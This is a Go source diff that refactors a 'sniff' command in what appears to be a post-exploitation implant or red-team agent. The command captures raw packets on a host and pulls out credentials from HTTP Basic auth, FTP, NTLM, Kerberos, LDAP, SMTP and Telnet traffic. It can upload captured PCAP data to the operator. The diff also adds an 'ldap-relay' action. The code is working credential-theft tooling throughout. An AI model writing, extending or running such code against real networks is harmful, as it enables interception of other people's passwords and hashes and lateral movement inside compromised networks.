@@ -4,10 +4,8 @@ package commands
 
 import (
 	"encoding/binary"
-	"encoding/json"
 	"fmt"
 	"net"
-	"strings"
 	"time"
 	"unsafe"
 
@@ -39,30 +37,11 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 	if params.Action == "relay" {
 		return c.executeRelay(task)
 	}
-
-	if params.Duration <= 0 {
-		params.Duration = 30
-	}
-	if params.Duration > 300 {
-		params.Duration = 300
-	}
-	if params.MaxBytes <= 0 {
-		params.MaxBytes = 50 * 1024 * 1024
+	if params.Action == "ldap-relay" {
+		return executeLDAPRelayCore(task)
 	}
 
-	var ports []uint16
-	if params.Ports != "" {
-		for _, p := range strings.Split(params.Ports, ",") {
-			p = strings.TrimSpace(p)
-			var port int
-			if _, err := fmt.Sscanf(p, "%d", &port); err == nil && port > 0 && port < 65536 {
-				ports = append(ports, uint16(port))
-			}
-		}
-	}
-	if len(ports) == 0 {
-		ports = []uint16{21, 53, 80, 88, 110, 143, 389, 445, 8080}
-	}
+	ports := sniffApplyDefaults(&params)
 
 	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_RAW, int(sniffHtons(unix.ETH_P_IP)))
 	if err != nil {
@@ -150,89 +129,17 @@ func (c *SniffCommand) Execute(task structs.Task) structs.CommandResult {
 		if etherType != 0x0800 {
 			continue
 		}
-		ipData := packet[14:]
-
-		if len(ipData) < 20 {
+		pkt := sniffParseIPPacket(packet[14:])
+		if pkt == nil {
 			continue
 		}
-		ihl := int(ipData[0]&0x0F) * 4
-		proto := ipData[9]
-		if ihl < 20 || ihl > len(ipData) || (proto != 6 && proto != 17) {
+		if !sniffMatchPort(ports, pkt.Meta.SrcPort, pkt.Meta.DstPort) {
 			continue
 		}
-		totalLen := int(binary.BigEndian.Uint16(ipData[2:4]))
-		if totalLen > len(ipData) {
-			totalLen = len(ipData)
-		}
-
-		meta := packetMeta{
-			SrcIP: net.IP(ipData[12:16]).String(),
-			DstIP: net.IP(ipData[16:20]).String(),
-		}
-		transportData := ipData[ihl:totalLen]
-
-		var payload []byte
-		if proto == 6 { // TCP
-			if len(transportData) < 20 {
-				continue
-			}
-			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
-			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
-			dataOff := int(transportData[12]>>4) * 4
-			if dataOff < 20 || dataOff > len(transportData) {
-				continue
-			}
-			payload = transportData[dataOff:]
-		} else { // UDP
-			if len(transportData) < 8 {
-				continue
-			}
-			meta.SrcPort = binary.BigEndian.Uint16(transportData[0:2])
-			meta.DstPort = binary.BigEndian.Uint16(transportData[2:4])
-			payload = transportData[8:]
-		}
-		if len(payload) == 0 {
-			continue
-		}
-
-		if cred := sniffExtractHTTPBasicAuth(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if meta.DstPort == 21 || meta.SrcPort == 21 {
-			if cred := ftpTracker.process(payload, &meta); cred != nil {
-				result.Credentials = append(result.Credentials, cred)
-			}
-		}
-		if cred := sniffExtractNTLM(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if cred := sniffExtractKerberos(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if cred := sniffExtractDNS(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if cred := sniffExtractLDAP(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if cred := sniffExtractSMTPAuth(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
-		if cred := telnetTracker.process(payload, &meta); cred != nil {
-			result.Credentials = append(result.Credentials, cred)
-		}
+		sniffExtractCredentials(pkt.Payload, &pkt.Meta, result, ftpTracker, telnetTracker)
 	}
 
-	result.Duration = time.Since(startTime).Truncate(time.Second).String()
-
-	// Upload PCAP if requested (link type 1 = LINKTYPE_ETHERNET)
-	if pcapCollector != nil && len(pcapCollector.packets) > 0 {
-		pcapData := pcapCollector.buildPCAP(1)
-		sniffUploadPCAP(&task, pcapData, result)
-	}
-
-	output, _ := json.Marshal(result)
-	return successResult(string(output))
+	return sniffFinalizeResult(&task, result, startTime, pcapCollector, 1)
 }
 
 func sniffBuildTCPFilter(ports []uint16) []unix.SockFilter {
